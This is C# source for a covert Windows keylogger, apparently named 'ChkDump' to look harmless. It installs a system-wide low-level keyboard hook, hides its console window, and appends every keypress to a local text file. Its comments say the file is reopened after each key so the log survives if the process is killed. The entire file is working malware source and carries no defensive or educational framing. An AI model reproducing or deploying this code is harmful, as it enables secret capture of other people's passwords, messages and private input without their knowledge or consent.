using System;
using System.Diagnostics;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.IO;
namespace ChkDump
{
    class Program
    {
        private const int Keyboard = 13;
        private const int KeyDown = 0x0100;
        private static LowLevelKeyboardProc _proc = HookCallback;
        private static IntPtr pointerToWindow = IntPtr.Zero;

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook,
            LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode,
            IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);

        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        const int SW_HIDE = 0;
        private delegate IntPtr LowLevelKeyboardProc(
            int nCode, IntPtr wParam, IntPtr lParam);

        private static IntPtr HookCallback(
            int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0 && wParam == (IntPtr)KeyDown)
            {
                int key = Marshal.ReadInt32(lParam);
                StreamWriter sw = new StreamWriter(Application.StartupPath + @"\dupa.txt", true); //because dupa is always alive
                sw.Write((Keys)key);
                sw.Close(); //open and close stream after each key, because we never know when somebody kill us:P
            }
            return CallNextHookEx(pointerToWindow, nCode, wParam, lParam);
        }
        private static IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            using (Process curProcess = Process.GetCurrentProcess())
            using (ProcessModule curModule = curProcess.MainModule)
            {
                return SetWindowsHookEx(Keyboard, proc,
                    GetModuleHandle(curModule.ModuleName), 0);
            }
        }

        static void Main(string[] args)
        {
            var handle = GetConsoleWindow();
            ShowWindow(handle, SW_HIDE); //function from user32.dll
            pointerToWindow = SetHook(_proc); //set hook to current process
            Application.Run();
            UnhookWindowsHookEx(pointerToWindow);
        }
    }
}
